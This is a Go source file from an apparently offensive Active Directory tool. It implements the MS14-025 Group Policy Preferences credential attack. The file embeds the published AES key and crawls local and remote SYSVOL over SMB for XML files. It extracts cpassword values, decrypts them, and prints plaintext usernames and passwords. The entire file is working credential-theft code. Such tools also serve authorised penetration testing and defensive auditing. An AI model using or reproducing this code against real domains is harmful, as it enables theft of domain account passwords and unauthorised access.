package attacks

import (
	"adreaper/internal/config"
	"adreaper/internal/output"
	"adreaper/internal/recon"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"unicode/utf16"
)

// GPP Key: MS14-025 Standard AES Key
var gppKey = []byte{
	0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9,
	0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
	0xf4, 0x96, 0xe8, 0xfa, 0xbd, 0x7d, 0x18, 0x5e,
	0xbb, 0xad, 0x10, 0xf0, 0xff, 0x44, 0xfa, 0xa4,
}

// GPPAttack scans for GPP XML files (local and remote) and decrypts passwords.
func GPPAttack(ctx context.Context, opts *config.Options) error {
	output.Info("Scanning for GPP XML files...")
	found := 0

	// 1. Local Search (for cases where the tool runs on a target or collector)
	localPaths := []string{
		`C:\Windows\SYSVOL\sysvol`,
		`C:\ProgramData\Microsoft\Group Policy\History`,
	}
	for _, lp := range localPaths {
		if _, err := os.Stat(lp); err == nil {
			output.Info("Scanning local path: %s", lp)
			_ = filepath.Walk(lp, func(path string, info os.FileInfo, err error) error {
				if err == nil && !info.IsDir() && strings.HasSuffix(strings.ToLower(info.Name()), ".xml") {
					checkXMLLocal(path, &found)
				}
				return nil
			})
		}
	}

	// 2. SMB search in SYSVOL (Remote SMB)
	smbCl, err := recon.NewSMBClient(opts)
	if err != nil {
		output.Warn("Could not connect to SMB on %s: %v", opts.DCIP, err)
	} else {
		defer smbCl.Close()
		share := "SYSVOL"
		output.Info("Scanning remote SMB share: \\\\%s\\%s", opts.DCIP, share)
		files, err := smbCl.WalkTree(share, ".", 10)
		if err != nil {
			output.Error("Failed to walk %s share: %v", share, err)
		} else if files != nil {
			processEntry(smbCl, share, files, &found)
		}
	}

	if found == 0 {
		output.Success("Scan complete. No GPP credentials found.")
	} else {
		output.Success("Scan complete. Found %d GPP credentials!", found)
	}

	return nil
}

func processEntry(smb *recon.SMBClient, share string, entry *output.TreeEntry, count *int) {
	if !entry.IsDir {
		if strings.HasSuffix(strings.ToLower(entry.Name), ".xml") {
			checkXML(smb, share, entry.Path, count)
		}
		return
	}

	for _, child := range entry.Children {
		processEntry(smb, share, child, count)
	}
}

func checkXMLLocal(path string, count *int) {
	content, err := os.ReadFile(path)
	if err != nil {
		return
	}
	extractAndDecrypt(string(content), path, count)
}

func checkXML(smb *recon.SMBClient, share, path string, count *int) {
	content, err := smb.DownloadFile(share, path)
	if err != nil {
		return
	}
	extractAndDecrypt(string(content), path, count)
}

func extractAndDecrypt(content, path string, count *int) {
	// Debug log for every file reached by the crawler
	if strings.HasSuffix(strings.ToLower(path), ".xml") {
		output.Info("  [Debug] Checking file: %s", path)
	}

	// Regex to find cpassword="..." and userName="..."
	reCPass := regexp.MustCompile(`cpassword="([^"]+)"`)
	reUser := regexp.MustCompile(`userName="([^"]+)"`)
	reName := regexp.MustCompile(`name="([^"]+)"`)

	matches := reCPass.FindAllStringSubmatch(content, -1)
	if len(matches) == 0 {
		return
	}

	for _, m := range matches {
		cpass := m[1]
		userMatch := reUser.FindStringSubmatch(content)
		if userMatch == nil {
			userMatch = reName.FindStringSubmatch(content)
		}

		username := "Unknown"
		if userMatch != nil {
			username = userMatch[1]
		}

		plain, err := DecryptGPP(cpass)
		if err != nil {
			output.Warn("  [!] Decryption failed for %s: %v", username, err)
			continue
		}

		output.Critical("[GPP] Found credential in %s", path)
		output.Info("  Username: %s", output.SuccessStr(username))
		output.Info("  Password: %s", output.CriticalStr(plain))
		*count++
	}
}

// DecryptGPP decrypts a GPP cpassword string.
func DecryptGPP(cpassword string) (string, error) {
	// Aggressive cleaning: remove all non-base64 characters
	reg := regexp.MustCompile("[^A-Za-z0-9+/=]")
	cpassword = reg.ReplaceAllString(cpassword, "")

	// 1. Padding if necessary
	for len(cpassword)%4 != 0 {
		cpassword += "="
	}

	// 2. Base64 decode
	data, err := base64.StdEncoding.DecodeString(cpassword)
	if err != nil {
		return "", err
	}

	// 3. AES Decrypt
	block, err := aes.NewCipher(gppKey)
	if err != nil {
		return "", err
	}

	if len(data) < aes.BlockSize {
		return "", fmt.Errorf("ciphertext too short")
	}

	// IV is 16 bytes of 0s
	iv := make([]byte, aes.BlockSize)
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(data, data)

	// 4. PKCS7 Unpadding
	if len(data) == 0 {
		return "", fmt.Errorf("empty decrypted data")
	}
	padding := int(data[len(data)-1])
	if padding > 0 && padding <= aes.BlockSize {
		data = data[:len(data)-padding]
	}

	// 5. UTF-16LE to UTF-8 (GPP null-pads UTF-16 strings)
	return cleanUTF16(data), nil
}

func cleanUTF16(b []byte) string {
	if len(b) < 2 {
		return string(b)
	}
	// Ensure even length for UTF-16 decoding
	if len(b)%2 != 0 {
		b = b[:len(b)-1]
	}

	u16s := make([]uint16, len(b)/2)
	for i := 0; i < len(u16s); i++ {
		u16s[i] = binary.LittleEndian.Uint16(b[i*2 : (i*2)+2])
	}

	// Decode and trim all possible nulls/newlines/whitespace
	res := string(utf16.Decode(u16s))
	return strings.TrimRight(res, "\x00\r\n\t ")
}
